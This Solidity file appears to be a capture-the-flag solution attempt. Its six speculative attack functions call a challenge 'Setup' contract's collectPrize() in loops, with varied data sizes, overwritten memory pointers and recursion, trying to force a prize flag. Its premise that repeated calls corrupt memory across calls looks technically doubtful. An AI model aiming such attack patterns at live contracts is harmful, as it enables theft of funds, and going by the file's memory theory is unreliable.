// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * Multi-Call Shop Exploit
 *
 * Hypothesis: Calling collectPrize() multiple times in the SAME transaction
 * causes memory interference that makes the staticcall read zeros at offset 0x54.
 *
 * Based on pattern from "The Contribution That Undid The Harbor" which needed
 * same-block batching for proposals.
 */

interface ISetup {
    function collectPrize(bytes calldata hookData) external;
    function collected() external view returns (bool);
    function setPlayer(address _player) external;
}

contract ShopExploit {

    /**
     * Attack 1: Multiple calls in same transaction
     * Try different numbers of calls to see if memory accumulation helps
     */
    function multiCall(address setup, uint256 numCalls) external returns (bool) {
        for(uint i = 0; i < numCalls; i++) {
            ISetup(setup).collectPrize("");
        }
        return ISetup(setup).collected();
    }

    /**
     * Attack 2: Multiple calls with different hookData sizes
     * Maybe memory expansion affects behavior
     */
    function multiCallWithData(address setup, uint256 callCount, uint256 dataSize) external returns (bool) {
        bytes memory hookData = new bytes(dataSize);
        for(uint i = 0; i < callCount; i++) {
            ISetup(setup).collectPrize(hookData);
        }
        return ISetup(setup).collected();
    }

    /**
     * Attack 3: Alternating patterns
     * Call with different patterns to create specific memory states
     */
    function alternatingCalls(address setup) external returns (bool) {
        ISetup(setup).collectPrize("");
        ISetup(setup).collectPrize(new bytes(32));
        ISetup(setup).collectPrize(new bytes(64));
        ISetup(setup).collectPrize(new bytes(84));
        ISetup(setup).collectPrize("");
        return ISetup(setup).collected();
    }

    /**
     * Attack 4: Memory pointer manipulation
     * Manually manipulate free memory pointer before calls
     */
    function memoryManipulation(address setup) external returns (bool) {
        assembly {
            // Save original free memory pointer
            let origPtr := mload(0x40)

            // Try different memory pointer values
            // This might cause staticcall to write to unexpected locations
            mstore(0x40, 0x1000)
        }

        ISetup(setup).collectPrize("");

        assembly {
            // Try another value
            mstore(0x40, 0x2000)
        }

        ISetup(setup).collectPrize("");

        return ISetup(setup).collected();
    }

    /**
     * Attack 5: Rapid succession with minimal gas
     * Multiple calls with tight gas limits
     */
    function rapidCalls(address setup) external returns (bool) {
        // Call multiple times rapidly
        // Memory state might not reset between calls
        try ISetup(setup).collectPrize("") {} catch {}
        try ISetup(setup).collectPrize("") {} catch {}
        try ISetup(setup).collectPrize("") {} catch {}
        try ISetup(setup).collectPrize("") {} catch {}
        try ISetup(setup).collectPrize("") {} catch {}

        return ISetup(setup).collected();
    }

    /**
     * Attack 6: Recursive pattern
     * Call from within a call (if possible)
     */
    function recursiveCall(address setup, uint256 depth) external returns (bool) {
        if (depth == 0) {
            ISetup(setup).collectPrize("");
        } else {
            this.recursiveCall(setup, depth - 1);
            ISetup(setup).collectPrize("");
        }
        return ISetup(setup).collected();
    }

    /**
     * Helper: Receive function to accept ETH if needed
     */
    receive() external payable {}

    /**
     * Helper: Check collected status without calling
     */
    function checkCollected(address setup) external view returns (bool) {
        return ISetup(setup).collected();
    }
}
